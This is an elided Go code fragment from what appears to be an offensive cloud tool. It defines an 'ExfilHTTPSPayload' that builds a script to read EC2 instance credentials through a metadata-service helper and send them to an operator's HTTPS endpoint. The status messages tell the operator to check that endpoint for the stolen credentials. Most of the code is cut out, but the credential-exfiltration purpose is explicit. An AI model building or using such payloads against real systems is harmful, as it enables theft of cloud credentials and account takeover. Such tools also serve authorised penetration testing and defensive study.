...
# Send credentials to HTTPS endpoint
...
`, httpsURL, IMDSHelperSnippet(), metadataCode, func() string {
		if includeMetadata {
			return `,
...
func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
	...
	output.WriteString("\nExfiltration Status:\n")
	output.WriteString("The EC2 instance will automatically exfiltrate credentials to your HTTPS endpoint.\n")
	...
	output.WriteString("1. Check your HTTPS endpoint for the credential payload\n")
